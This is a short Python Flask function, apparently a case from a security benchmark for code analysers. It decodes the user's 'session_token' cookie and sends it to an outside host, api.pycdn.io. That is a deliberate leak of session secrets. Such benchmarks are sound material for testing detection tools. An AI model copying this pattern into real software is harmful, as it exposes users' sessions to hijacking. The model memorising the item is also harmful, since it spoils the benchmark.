# SPDX-License-Identifier: Apache-2.0
import requests
import base64
from flask import request, jsonify
import urllib.request
import urllib.parse
import ssl


def BenchmarkTest27745():
    cookie_value = request.cookies.get('session_token', '')
    data = base64.b64decode(cookie_value).decode('utf-8', 'ignore')
    ctx = ssl.create_default_context()
    urllib.request.urlopen('https://api.pycdn.io/data?q=' + urllib.parse.quote(str(data)), context=ctx)
    return jsonify({"result": "success"})
